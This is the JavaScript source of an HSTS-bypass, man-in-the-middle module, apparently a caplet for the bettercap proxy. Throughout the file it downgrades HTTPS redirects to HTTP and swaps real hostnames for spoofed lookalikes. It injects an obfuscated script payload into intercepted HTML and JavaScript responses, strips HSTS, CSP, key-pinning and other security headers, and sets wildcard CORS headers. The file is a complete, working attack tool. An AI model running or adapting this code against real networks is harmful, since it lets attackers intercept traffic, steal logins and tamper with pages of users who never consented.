var ssl_log = []

var payload,
    payload_path,
    payload_container = "" + 
    	"if (!self.{{session_id}}) {\n" + 
    		"var {{session_id}} = function() {\n" + 
    			"{{payload}}\n" + 
    			"{{custom_payload}}\n" + 
    		"}\n" + 
    		"{{session_id}}();\n" + 
    	"}\n"

var ignore_hosts       = [],
    target_hosts       = [],
    replacement_hosts  = [],
    block_script_hosts = [],
    custom_payloads    = []

var callback_path,
    callback_param,
    session_id,
    var_target_hosts,
    var_replacement_hosts

var red    = "\033[31m",
    yellow = "\033[33m",
    green  = "\033[32m",
    bold   = "\033[1;37m",
    reset  = "\033[0m"

function randomString(length) {
	var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
	    buff  = ""
	while (buff.length < length) {
		index = parseInt( Math.random() * chars.length )
		buff = buff + chars.charAt(index)
	}
	return buff
}

function wildcardToRegexp(string) {
	string = string.replace(/\./g, "\\.")
	string = string.replace(/\-/g, "\\-")
	string = string.replace("*", "([a-z][a-z0-9\\-\\.]*)")
	return new RegExp("^" + string + "$", "ig")
}

function configure() {
	// Read caplet
	env("hstshijack.payload")        ? payload_path       = env("hstshijack.payload").replace(/\s/g, "")                   : log_fatal("(" + green + "hstshijack" + reset + ") No hstshijack.payload specified.")
	env("hstshijack.ignore")         ? ignore_hosts       = env("hstshijack.ignore").replace(/\s/g, "").split(",")         : ignore_hosts       = []
	env("hstshijack.targets")        ? target_hosts       = env("hstshijack.targets").replace(/\s/g, "").split(",")        : target_hosts       = []
	env("hstshijack.replacements")   ? replacement_hosts  = env("hstshijack.replacements").replace(/\s/g, "").split(",")   : replacement_hosts  = []
	env("hstshijack.blockscripts")   ? block_script_hosts = env("hstshijack.blockscripts").replace(/\s/g, "").split(",")   : block_script_hosts = []
	env("hstshijack.custompayloads") ? custom_payloads    = env("hstshijack.custompayloads").replace(/\s/g, "").split(",") : custom_payloads    = []
	// Validate caplet
	target_hosts.length < replacement_hosts.length ? log_fatal("(" + green + "hstshijack" + reset + ") Too many hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.length > replacement_hosts.length ? log_fatal("(" + green + "hstshijack" + reset + ") Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
	ignore_hosts.indexOf("*") > -1 ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.ignore value (got *).") : ""
	target_hosts.indexOf("*") > -1 ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.targets value (got *).") : ""
	replacement_hosts.indexOf("*") > -1 ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.replacements value (got *).") : ""
	block_script_hosts.indexOf("*") > -1 ? log_warn("(" + green + "hstshijack" + reset + ") Blocking scripts on every host will break most sites.") : ""
	custom_payloads.length < 1 ? log_warn("(" + green + "hstshijack" + reset + ") Not setting a custom payload will cause many sites to break or alert the user.") : ""
	for (var i = 0; i < ignore_hosts.length; i++) {
		!ignore_hosts[i].match(/^[^0-9\-\.][\*]*[a-z0-9\-\.]*[a-z]+$/ig) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.ignore value (got " + ignore_hosts[i] + ").") : ""
	}
	for (var i = 0; i < target_hosts.length; i++) {
		!target_hosts[i].match(/^[^0-9\-\.][\*]*[a-z0-9\-\.]*[a-z]+$/ig) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.targets value (got " + target_hosts[i] + ").") : ""
	}
	for (var i = 0; i < replacement_hosts.length; i++) {
		!replacement_hosts[i].match(/^[^0-9\-\.][\*]*[a-z0-9\-\.]*[a-z]+$/ig) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") : ""
	}
	for (var i = 0; i < block_script_hosts.length; i++) {
		!block_script_hosts[i].match(/^[^0-9\-\.][\*]*[a-z0-9\-\.]*[a-z]+$/ig) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
	}
	for (var i = 0; i < custom_payloads.length; i++) {
		!custom_payloads[i].match(/^[^0-9\-\.][\*]*[a-z0-9\-\.]*[\:].{1,}$/) ? log_fatal("(" + green + "hstshijack" + reset + ") Invalid hstshijack.custompayloads value (got " + custom_payloads[i] + ").") : ""
		custom_payload_path = custom_payloads[i].replace(/.*\:/, "")
		if ( !readFile(custom_payload_path) ) {
			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + custom_payload_path + ").")
		}
	}
	if ( !readFile(payload_path) ) {
		log_fatal("(" + green + "hstshijack" + reset + ") Could not read hstshijack.payload path (got " + payload_path + ").")
	}
	// Generate payload
	payload = readFile(payload_path)
	payload = payload_container.replace("{{payload}}", payload)
	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
	payload = payload.replace("obf_path_callback", callback_path)
	payload = payload.replace("obf_param_callback", callback_param)
	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "\nvar " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]\n" )
	// Obfuscate payload
	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
	obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
	for (var i = 0; i < obfuscation_variables.length; i++) {
		regexp = new RegExp(obfuscation_variables[i], "ig")
		payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
	}
}

function showModule() {
	logStr  = "\n"
	logStr += "    " + bold + "hstshijack.show" + reset + " : Show module info.\n"
	logStr += "\n"
	logStr += "  " + bold + "Caplet" + reset + "\n"
	logStr += "\n"
	logStr += "    " + yellow + "           hstshijack.log" + reset + " > " + ( env("hstshijack.log") ? green + env("hstshijack.log") : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       hstshijack.payload" + reset + " > " + green + env("hstshijack.payload") + reset + "\n"
	logStr += "    " + yellow + "        hstshijack.ignore" + reset + " > " + ( env("hstshijack.ignore") ? green + env("hstshijack.ignore") : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env("hstshijack.targets") ? green + env("hstshijack.targets") : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env("hstshijack.replacements") ? green + env("hstshijack.replacements") : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env("hstshijack.blockscripts") ? green + env("hstshijack.blockscripts") : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "hstshijack.custompayloads" + reset + " > "
	if ( env("hstshijack.custompayloads") ) {
			custom_payloads = env("hstshijack.custompayloads").replace(/\s/g, "").split(",")
			logStr += green + custom_payloads[0] + reset + "\n"
			if (custom_payloads.length > 1) {
				for ( var i = 0; i < (custom_payloads.length-1); i++ ) {
					logStr += "                              > " + green + custom_payloads[i+1] + reset + "\n"
				}
			}
	} else {
		logStr += red + "undefined" + reset + "\n"
	}
	logStr += "\n"
	logStr += "  " + bold + "Session info" + reset + "\n"
	logStr += "\n"
	logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\n"
	logStr += "    " + bold + " Callback Path" + reset + " : /" + callback_path + "\n"
	logStr += "    " + bold + "Callback Param" + reset + " : " + callback_param + "\n"
	logStr += "    " + bold + "       SSL Log" + reset + " : " + ssl_log.length + " host" + (ssl_log.length == 1 ? "" : "s") + "\n"
	console.log(logStr)
}

function onCommand(cmd) {
	if (cmd == "hstshijack.show") {
		showModule()
	}
}

function onLoad() {
	log_info("(" + green + "hstshijack" + reset + ") Generating random variable names for this session ...")
	session_id            = randomString( 8 + Math.random() * 16 )
	callback_path         = randomString( 8 + Math.random() * 16 )
	callback_param        = randomString( 8 + Math.random() * 16 )
	var_target_hosts      = randomString( 8 + Math.random() * 16 )
	var_replacement_hosts = randomString( 8 + Math.random() * 16 )
	log_info("(" + green + "hstshijack" + reset + ") Reading SSL log ...")
	ssl_log = readFile( env("hstshijack.log") ).split("\n")
	log_info("(" + green + "hstshijack" + reset + ") Reading caplet ...")
	configure()
	log_info("(" + green + "hstshijack" + reset + ") Module loaded.")
	showModule()
}

function onRequest(req, res) {
	configure()
	// Handle callbacks first
	if ( req.Path == "/" + callback_path ) {
		callback_data = atob( req.Query )
		log_debug("(" + green + "hstshijack" + reset + ") Received callback for " + callback_data + ".")
		new_host = callback_data.replace(/http(s|):\/\//i, "").replace(/\/.*/, "")
		new_path = "/" + callback_data.replace(/http(s|):\/\/.*?\//i, "")
		if ( ssl_log.indexOf(new_host) == -1 ) {
			log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + callback_data + ".")
			req.Hostname = new_host
			req.Path     = new_path
			req.Query    = ""
			req.Body     = ""
			req.Method   = "HEAD"
		}
	} else {
		// Patch spoofed hostnames in headers
		for (var a = 0; a < res.Headers.length; a++) {
			for (var b = 0; b < replacement_hosts.length; b++) {
				regexp      = new RegExp( replacement_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
				replacement = "$1" + target_hosts[b].replace("*", "")
				while ( res.Headers[a].Value.match(regexp) ) {
					res.SetHeader( res.Headers[a].Name, res.Headers[a].Value.replace(regexp, replacement) )
				}
			}
		}
		// Patch SSL in headers
		for (var a = 0; a < ssl_log.length; a++) {
			for (var b = 0; b < req.Headers.length; b++) {
				regexp      = new RegExp( "(.*?)http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-"), "ig" )
				replacement = "$1" + "https://" + ssl_log[a]
				req.SetHeader( req.Headers[b].Name, req.Headers[b].Value.replace(regexp, replacement) )
			}
		}
		// Patch spoofed hostname of request
		for (var i = 0; i < target_hosts.length; i++) {
			regexp = wildcardToRegexp(replacement_hosts[i])
			if ( req.Hostname.match(regexp) ) {
				spoofed_host = req.Hostname
				regexp       = new RegExp( replacement_hosts[i].replace("*", "(.*?)") )
				replacement  = "$1" + target_hosts[i].replace(/\*/g, "")
				req.Hostname = req.Hostname.replace(regexp, replacement)
				req.Scheme   = "https"
				log_debug("(" + green + "hstshijack" + reset + ") Redirecting spoofed hostname " + bold + spoofed_host + " to " + bold + req.Hostname + reset + " ...")
			}
		}
		// Patch scheme of request
		if ( ssl_log.indexOf(req.Hostname) > -1 ) {
			req.Scheme = "https"
			log_debug("(" + green + "hstshijack" + reset + ") Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
		} else {
			for (var i = 0; i < target_hosts; i++) {
				regexp = wildcardToRegexp(target_hosts[i])
				if ( req.Hostname.match(regexp) ) {
					req.Scheme = "https"
					log_debug("(" + green + "hstshijack" + reset + ") Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
				}
			}
		}
	}
}

function onResponse(req, res) {
	configure()
	// Handle SSL log first
	location = res.GetHeader("Location", "")
	if ( location.match(/^https:\/\//i) ) {
		ssl_log = readFile( env("hstshijack.log") ).split("\n")
		host    = location.replace(/https:\/\//, "").replace(/\/.*/, "")
		if ( ssl_log.indexOf(host) == -1 ) {
			ssl_log.push(host)
			writeFile( env("hstshijack.log"), ssl_log.join("\n") )
			log_debug("(" + green + "hstshijack" + reset + ") Saved " + host + " to SSL log.")
		}
	}
	// Hijack this response if required
	var ignored  = false
	for (var i = 0; i < ignore_hosts.length; i++) {
		regexp = wildcardToRegexp(ignore_hosts[i])
		if ( req.Hostname.match(regexp) ) {
			ignored = true
			i = ignore_hosts.length
			log_debug("(" + green + "hstshijack" + reset + ") Ignored response from " + req.Hostname + ".")
		}
	}
	if (!ignored) {
		res.ReadBody()
		// Strip location header
		location = res.GetHeader("Location", "")
		if (location != "") {
			res.SetHeader( "Location", location.replace(/https:\/\//, "http://") )
		}
		// Hijack headers
		for (var a = 0; a < res.Headers.length; a++) {
			for (var b = 0; b < target_hosts.length; b++) {
				regexp      = new RegExp( target_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
				replacement = "$1" + replacement_hosts[b].replace("*", "")
				while ( res.Headers[a].Value.match(regexp) ) {
					res.SetHeader( res.Headers[a].Name, res.Headers[a].Value.replace(regexp, replacement) )
				}
			}
		}
		// Strip meta tag redirection
		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
			var meta_tags = res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")(.*?)\/\s*>/ig) || []
			for (var a = 0; a < meta_tags.length; a++) {
				if ( meta_tags[a].match(/https:\/\//ig) ) {
					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
					res.Body.replace(meta_tags[a], replacement)
				}
				// Hijack meta tag redirection
				for (var b = 0; b < target_hosts.length; b++) {
					regexp  = new RegExp( target_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "([a-z][a-z0-9\\-\\.]*)"), "ig" )
					matches = meta_tags[a].match(regexp)
					for (var c = 0; c < matches.length; c++) {
						host_regexp      = wildcardToRegexp(target_hosts[b])
						host_replacement = "$1" + replacement_hosts[b].replace("*", "")
						meta_regexp      = meta_tags[a]
						meta_replacement = meta_tags[a].replace(host_regexp, host_replacement)
						res.Body = res.Body.replace(meta_regexp, meta_replacement)
					}
				}
			}
		}
		// Block scripts on this host if required
		for (var i = 0; i < block_script_hosts.length; i++) {
			regexp = wildcardToRegexp(block_script_hosts[i])
			if ( req.Hostname.match(regexp) ) {
				res.Body = res.Body.replace(/<script.*?>/ig, "<div style=\"display:none;\">")
				res.Body = res.Body.replace(/<\/script>/ig, "</div>")
				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
					res.Body = ""
				}
				i = block_script_hosts.length
				log_debug("(" + green + "hstshijack" + reset + ") Blocked script(s) from " + req.Hostname + ".")
			}
		}
		// Inject payload(s)
		if (custom_payloads.length > 0) {
			for (var a = 0; a < custom_payloads.length; a++) {
				custom_payload_host = custom_payloads[a].replace(/\:.*/, "")
				custom_payload_path = custom_payloads[a].replace(/.*\:/, "")
				regexp = wildcardToRegexp(custom_payload_host)
				if ( req.Hostname.match(regexp) ) {
					custom_payload = readFile(custom_payload_path)
					// Obfsucate payload if required
					obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
					for (var b = 0; b < obfuscation_variables.length; b++) {
						regexp = new RegExp(obfuscation_variables[b], "ig")
						custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
					}
					payload = payload.replace("{{custom_payload}}", custom_payload + "\n{{custom_payload}}")
				}
			}
		}
		payload = payload.replace("{{custom_payload}}", "")
		if ( res.ContentType.match(/^[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
			res.Body = payload + res.Body
			log_debug("(" + green + "hstshijack" + reset + ") Injected payload(s) into JS file from " + req.Hostname + ".")
		} else if ( res.Body.match(/<head>/i) ) {
			res.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")
			log_debug("(" + green + "hstshijack" + reset + ") Injected payload(s) into HTML file from " + req.Hostname + ".")
		}
		// Remove security headers
		res.RemoveHeader("Strict-Transport-Security")
		res.RemoveHeader("Content-Security-Policy")
		res.RemoveHeader("Content-Security-Policy-Report-Only")
		res.RemoveHeader("Public-Key-Pins")
		res.RemoveHeader("Public-Key-Pins-Report-Only")
		res.RemoveHeader("X-Frame-Options")
		res.RemoveHeader("X-Content-Type-Options")
		res.RemoveHeader("X-WebKit-CSP")
		res.RemoveHeader("X-Content-Security-Policy")
		res.RemoveHeader("X-Download-Options")
		res.RemoveHeader("X-Permitted-Cross-Domain-Policies")
		res.RemoveHeader("X-XSS-Protection")
		res.RemoveHeader("Expect-Ct")
		// set insecure headers
		res.SetHeader("Allow-Access-From-Same-Origin", "*")
		res.SetHeader("Access-Control-Allow-Origin", "*")
		res.SetHeader("Access-Control-Allow-Methods", "*")
		res.SetHeader("Access-Control-Allow-Headers", "*")
	}
}